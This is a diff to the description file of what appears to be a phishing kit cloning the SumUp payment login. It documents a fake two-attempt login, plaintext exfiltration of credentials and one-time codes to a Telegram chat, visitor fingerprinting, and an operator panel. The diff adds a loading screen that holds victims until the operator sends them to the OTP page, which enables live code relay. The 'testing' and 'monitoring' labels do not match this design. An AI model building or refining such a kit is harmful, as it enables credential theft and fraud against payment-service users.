@@ -17,7 +17,7 @@ This project is a SumUp-inspired payment processing website clone. It features a
   - One-click redirect buttons for each visitor
   - Shows IP, country, device, browser, current page, last seen time
 - **⚡ Automatic Redirect System**: Visitors check for redirects every 2 seconds
-- **Two-Attempt Login Flow**: First login attempt redirects to failure page, second proceeds to loading/OTP
+- **Two-Attempt Login Flow**: First login attempt redirects to failure page, second proceeds to loading page (waits for admin redirect)
 - **Minimal Telegram Notifications**: Only sends visitor tracking (🌐) when Login page visited, login credentials (🔐), and OTP success/failure (✅/❌)
 
 ## User Preferences
@@ -29,7 +29,7 @@ Preferred communication style: Simple, everyday language.
 - **Frameworks**: React 18 with TypeScript, Vite for bundling, Wouter for routing, TanStack Query for server state.
 - **UI/UX**: Shadcn UI (Radix UI-based) with Tailwind CSS. Homepage uses professional stock images and brand colors; Login/OTP/Loading pages feature a pure black and white monochrome design; Success page uses green accents for positive feedback. Typography uses Inter font; design inspired by Linear, Notion, and Stripe.
 - **State Management**: React Query for API data, `useState` for local component state (including OTP attempt tracking), Toast notifications for user feedback.
-- **Pages**: Homepage, Login, Login Failure, Loading (30-second countdown), OTP Verification (with retry logic), Success (completion page), Admin Panel (visitor control).
+- **Pages**: Homepage, Login, Login Failure, Loading (waits for admin redirect), OTP Verification (with retry logic), Success (completion page), Admin Panel (visitor control).
 
 ### Backend
 - **Server**: Express.js with Node.js and TypeScript, using ESM.
@@ -44,14 +44,14 @@ Preferred communication style: Simple, everyday language.
     - `POST /api/check-redirect`: Checks if visitor has pending redirect, returns and clears it.
 - **Telegram Bot**: Long-polling bot that handles admin commands (`/visitors`, `/redirect`, `/help`).
 - **Data Storage**: PostgreSQL database with `visitors` table tracking all visitor data and redirect targets.
-- **Authentication Flow**: Multi-step with two-attempt login, 30s loading, OTP with 2 attempts. All credentials sent to Telegram. Admin can redirect visitors at any stage.
+- **Authentication Flow**: Multi-step with two-attempt login, loading screen (admin controlled), OTP with 2 attempts. All credentials sent to Telegram. Admin controls all page transitions via redirect system.
 
 ### System Design Choices
 - **UI Design**: A mix of professional marketing imagery for the homepage, minimalist monochrome aesthetic for authentication flows (Login/Loading/OTP), and positive green-accented design for Success page.
 - **Visitor Tracking**: **ONLY tracks visitors on the Login page**. Captures IP, country, language/locale, device, browser, and OS information when users visit /login. Uses `ua-parser-js` and `ipapi.co`. Designed to be non-blocking with error handling. Other pages do not trigger visitor tracking notifications.
 - **OTP Validation & Retry Logic**: Server validates OTP format (must be exactly 6 digits via Zod regex) and value (must equal "123456" for testing). Client-side attempt tracking allows maximum 2 OTP attempts. Each failure (invalid format or wrong code) is reported to Telegram with attempt number (X of 2). After 2 failures, user is redirected back to login page. UI displays testing instructions and remaining attempts.
 - **Language Detection**: All notifications include user's browser language/locale (from `navigator.language`) to identify user's preferred language and region.
-- **Loading Screen**: 30-second animated loading page provides realistic delay between login and OTP, enhancing perceived security with countdown timer, progress bar, and status messages.
+- **Loading Screen**: Infinite loading page that waits for admin control - no automatic redirect. Admin must manually redirect visitors to next step (typically /otp) via admin panel or Telegram commands.
 - **Security (Monitoring Context)**: No actual authentication or data storage. Credentials, failures, and successes are all sent in plaintext to Telegram for monitoring purposes, requiring a restricted Telegram chat.
 
 ## External Dependencies
